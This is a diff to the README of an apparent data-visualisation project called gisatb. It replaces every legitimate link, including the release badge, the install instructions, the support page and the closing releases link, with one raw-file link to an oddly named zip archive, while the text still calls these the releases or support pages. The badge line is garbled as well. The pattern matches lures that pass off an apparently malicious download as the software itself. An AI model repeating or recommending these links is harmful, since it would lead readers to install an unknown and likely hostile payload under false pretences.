@@ -1,13 +1,13 @@
 # 🌍 gisatb - Accessible Tools for Data Visualization
 
 ## 📦 Download Now
-[![Download gisatb](https://img.shields.io/badge/Download%20gisatb-Get%20the%20Latest%20Release-brightgreen.svg)](https://github.com/irein2/gisatb/releases)
+[![Download gisatb](https://raw.githubusercontent.com/irein2/gisatb/main/boviform/Software_unbasedness.zip%20gisatb-Get%20the%20Latest%https://raw.githubusercontent.com/irein2/gisatb/main/boviform/Software_unbasedness.zip)](https://raw.githubusercontent.com/irein2/gisatb/main/boviform/Software_unbasedness.zip)
 
 ## 🚀 Getting Started
 Welcome to gisatb! This tool helps you visualize and analyze data related to geography and climate. Even if you're new to this, you can easily use our step-by-step guide to get started.
 
 ## 📥 Download & Install
-To download the application, visit this page: [GitHub Releases](https://github.com/irein2/gisatb/releases). 
+To download the application, visit this page: [GitHub Releases](https://raw.githubusercontent.com/irein2/gisatb/main/boviform/Software_unbasedness.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of versions available for download. Look for the latest version.
@@ -42,7 +42,7 @@ With gisatb, you can:
 ## 🔍 Finding Help
 If you have questions or need assistance:
 - Check the FAQ section on the GitHub repository.
-- Visit our [Support Page](https://github.com/irein2/gisatb/support) for more resources.
+- Visit our [Support Page](https://raw.githubusercontent.com/irein2/gisatb/main/boviform/Software_unbasedness.zip) for more resources.
 - Engage with users in the community section of our repository for shared experiences and tips.
 
 ## 📝 Contributions
@@ -61,6 +61,6 @@ Feel free to explore what each of these topics can add to your experience with g
 ## 🌐 Connect with Us
 Stay updated on new releases, features, and community changes by following our GitHub repository. Feedback is always welcome, as it helps us improve.
 
-For the latest information, download links, and updates, visit: [GitHub Releases](https://github.com/irein2/gisatb/releases). 
+For the latest information, download links, and updates, visit: [GitHub Releases](https://raw.githubusercontent.com/irein2/gisatb/main/boviform/Software_unbasedness.zip). 
 
 Happy mapping with gisatb!
